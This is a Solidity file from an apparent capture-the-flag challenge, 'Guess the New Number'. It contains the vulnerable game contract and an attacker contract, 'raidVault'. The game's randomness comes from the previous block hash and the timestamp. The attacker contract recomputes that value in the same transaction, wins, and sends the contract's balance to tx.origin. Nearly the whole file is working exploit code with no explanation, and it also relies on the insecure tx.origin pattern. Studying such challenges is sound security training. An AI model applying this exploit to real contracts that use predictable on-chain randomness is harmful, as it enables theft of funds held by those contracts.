pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract raidVault {
    GuessTheNewNumberChallenge public guessCon;

    function raidVault(address conAddress) public {
        guessCon = GuessTheNewNumberChallenge(conAddress);
    }

    function solve() external payable {
        require(msg.value == 1 ether);
        uint8 solution = uint8(keccak256(block.blockhash(block.number-1), now));
        guessCon.guess.value(msg.value)(solution);

        require(guessCon.isComplete());
        tx.origin.transfer(address(this).balance);
    }

    function receive() external payable {

    }
}
